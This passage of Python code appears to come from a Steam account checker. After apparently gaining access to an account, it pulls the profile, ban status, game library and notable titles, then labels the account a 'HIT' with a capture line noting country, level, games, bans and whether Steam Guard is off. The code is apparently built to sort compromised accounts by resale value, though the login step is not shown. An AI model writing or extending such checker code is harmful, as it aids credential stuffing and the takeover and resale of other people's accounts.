            s, summary_data = self._get_json(sess, self._summary_url, {"key": access_token, "steamids": steamid}, timeout=20)
            summary = {}
            if s == 200:
                players = (summary_data.get("response", {})).get("players") or []
                summary = players[0] if players else {}
            s, bans_data = self._get_json(sess, self._bans_url, {"key": access_token, "steamids": steamid}, timeout=20)
            bans = {}
            if s == 200:
                players = (bans_data.get("response", {})).get("players") or []
                bans = players[0] if players else {}
            country = (summary.get("loccountrycode") or "N/A").upper()
            persona = summary.get("personaname", "N/A")
            vac_bans = bans.get("NumberOfVACBans", 0)
            trade_ban = str(bans.get("EconomyBan", "none") != "none").lower()
            limited = str(level == 0 and game_count == 0).lower()
            has_value = game_count > 0
            notable = []
            game_ids = {g["appid"] for g in games_list}
            for appid, name in self._notable_games.items():
                if appid in game_ids:
                    for g in games_list:
                        if g["appid"] == appid: notable.append({"appid": appid, "name": name, "playtime": g["playtime"]}); break
            plan = (f"Guard = None | Country = {country} | Level = {level if level >= 0 else 'N/A'} | Games = {game_count if game_count >= 0 else 'N/A'} | VACBans = {vac_bans} | Tradeban = {trade_ban} | Limited = {limited}")
            result['status'] = 'HIT'; result['steamid'] = steamid; result['persona'] = persona; result['country'] = country; result['level'] = level; result['game_count'] = game_count
            result['games_list'] = games_list; result['notable'] = notable; result['vac_bans'] = vac_bans; result['trade_ban'] = trade_ban; result['limited'] = limited; result['guard'] = guard_label
            result['has_value'] = has_value; result['plan'] = plan
            return result
        except Exception as e: result['reason'] = str(e)[:80]; return result
